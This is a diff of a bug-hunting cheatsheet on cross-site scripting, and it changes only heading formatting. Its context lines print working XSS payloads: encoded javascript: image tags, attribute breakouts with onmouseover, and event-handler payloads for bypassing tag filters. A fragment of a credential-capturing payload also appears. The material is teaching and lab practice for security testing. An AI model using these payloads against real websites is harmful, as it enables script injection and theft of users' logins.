@@ -105,7 +105,7 @@ body:username.value+':'+this.value
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
 ```
-##### XSS Filter Evasion Cheat Sheet
+**XSS Filter Evasion Cheat Sheet**
 https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
 ### For html Injection
 ```
@@ -114,7 +114,7 @@ https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.ht
 <a href="https://google.com"></a>
 ```
 ## Angle brackets HTML-encoded bypass
-### Reflected XSS into HTML attribute with angle brackets HTML-encoded
+**Reflected XSS into HTML attribute with angle brackets HTML-encoded**
 Inject ```<xss123>'"``` and see if the angle ```<>``` brackets are encoded with ```&lt;``` and ```&gt;```.
   ![Screenshot from 2024-06-12 22-48-00](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/4bb3d36b-cef6-49ae-ab0d-a4c6ad9c8553)<br>
 If this is the case, you should inject this payloads. 
@@ -125,7 +125,7 @@ If this is the case, you should inject this payloads.
 " onmouseover="alert(1)
 ```
 ![Screenshot from 2024-06-22 22-10-29](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5f0c53d6-0489-483d-a82d-373456ee9233)
-### Reflected XSS into a JavaScript string with angle brackets HTML encoded
+**Reflected XSS into a JavaScript string with angle brackets HTML encoded**
 Inject ```<xss123>'"``` and see if your payload encoded in a javascript code.<br>
 ![Screenshot from 2024-06-13 00-19-30](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/9180969c-2299-4adf-9c4a-a05e97629938)<br>
 In this case you should try this payload to braek the code to inject maliciuos payload.
@@ -155,13 +155,13 @@ In this case you can try this payload
 And the final code will look like this.
 <br>![Screenshot from 2024-07-01 21-50-00](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/3c75b4b8-173c-4bf7-8c3b-bc87dbc90386)
 ## Tags and Attribute Block Bypass
-### Reflected XSS into HTML context with most tags and attributes blocked
+**Reflected XSS into HTML context with most tags and attributes blocked**
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked. Bruteforce for getting allowed tags.
 ```
 "><body onresize=alert(1337)>
 ```
-### Reflected XSS into HTML context with all tags blocked except custom ones
-###### Key Note
+**Reflected XSS into HTML context with all tags blocked except custom ones**
+***Key Note***
 ```tabindex="1"```, ```id="a1"```, ```#a1```
 ```
 <custom-tag tabindex="1" onfocus='alert(1337)' id="a1">#a1
